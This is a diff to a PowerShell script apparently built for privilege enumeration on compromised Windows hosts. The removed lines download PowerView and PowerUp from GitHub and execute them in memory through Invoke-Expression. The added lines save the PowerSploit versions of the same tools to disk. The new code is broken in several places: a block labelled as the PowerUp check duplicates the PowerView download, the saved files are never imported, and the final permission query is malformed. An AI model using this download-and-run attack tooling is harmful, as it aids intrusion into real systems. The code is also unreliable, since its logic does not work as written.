@@ -36,20 +36,57 @@ Write-Host "Privileges:`n$($privileges -join "`n")"
 Write-Host "`n"
 Write-Host "Importing powerview and powerup modules"
 ## Import powerview and powerup modules
-try {
-    $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerView.ps1' -UseBasicParsing
-    Invoke-Expression $($pwContent.Content)
-    Import-Module PowerView
-    Write-Output "Powerview loaded"
-} catch {
-    Write-Output "Could not load Powerview: $($_.Exception.Message)"
+## Check for PowerView module and download if missing
+if (-not (Get-Module -Name PowerView -ListAvailable)) {
+    Write-Output "PowerView module not found, downloading to current directory..."
+    try {
+        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
+        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
+        Write-Output "PowerView downloaded successfully"
+    } catch {
+        Write-Output "Could not download PowerView: $($_.Exception.Message)"
+    }
+} else {
+    Write-Output "PowerView module found"
 }
 
-try {
-    $puContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerUp.ps1' -UseBasicParsing
-    Invoke-Expression $($puContent.Content)
-    Import-Module PowerUp
-    Write-Output "PowerUp loaded"
-} catch {
-    Write-Output "Could not load PowerUp: $($_.Exception.Message)"
+## Check for PowerUp module and download if missing
+if (-not (Get-Module -Name PowerView -ListAvailable)) {
+    Write-Output "PowerView module not found, downloading to current directory..."
+    try {
+        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
+        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
+        Write-Output "PowerView downloaded successfully"
+    } catch {
+        Write-Output "Could not download PowerView: $($_.Exception.Message)"
+    }
+} else {
+    Write-Output "PowerView module found"
 }
+
+## Check for PowerUp module and download if missing
+if (-not (Get-Module -Name PowerUp -ListAvailable)) {
+    Write-Output "PowerUp module not found, downloading to current directory..."
+    try {
+        $puContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1' -UseBasicParsing
+        $puContent.Content | Out-File -FilePath ".\PowerUp.ps1"
+        Write-Output "PowerUp downloaded successfully"
+    } catch {
+        Write-Output "Could not download PowerUp: $($_.Exception.Message)"
+    }
+} else {
+    Write-Output "PowerUp module found"
+}
+
+## Use PowerView to get privileges if available
+if (Get-Module -Name PowerView -ListAvailable) {
+    try {
+        $privileges2 = Get-NetEffectivePermission -ObjectName '' | Select-Object -ExpandProperty PrincipalProperty | ForEach-Object {$_.DisplayName}
+    } catch {
+        Write-Output "Could not get privileges with PowerView: $($_.Exception.Message)"
+    }
+} else {
+    Write-Output "PowerView module not available, skipping privilege enumeration"
+}
+Write-Host "`n"
+Write-Host "Privileges from PowerView:`n$($privileges2 -join "`n")"
